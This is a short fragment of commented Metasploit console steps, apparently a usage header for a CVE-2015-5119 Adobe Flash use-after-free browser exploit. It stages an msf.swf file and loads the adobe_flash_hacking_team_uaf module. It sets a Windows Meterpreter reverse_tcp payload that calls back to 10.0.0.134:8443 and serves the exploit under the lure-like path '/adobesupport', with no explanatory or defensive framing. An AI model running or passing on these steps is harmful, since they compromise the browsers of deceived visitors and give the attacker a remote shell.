...
# /usr/share/metasploit-framework/data/exploits# mkdir CVE-2015-5119
# /usr/share/metasploit-framework/data/exploits# cp /root/Downloads/msf.swf ./CVE-2015-5119/
#
# use exploit/multi/browser/adobe_flash_hacking_team_uaf
# set payload windows/meterpreter/reverse_tcp
# set LHOST 10.0.0.134; LPORT 8443; URIPATH /adobesupport
# exploit
##
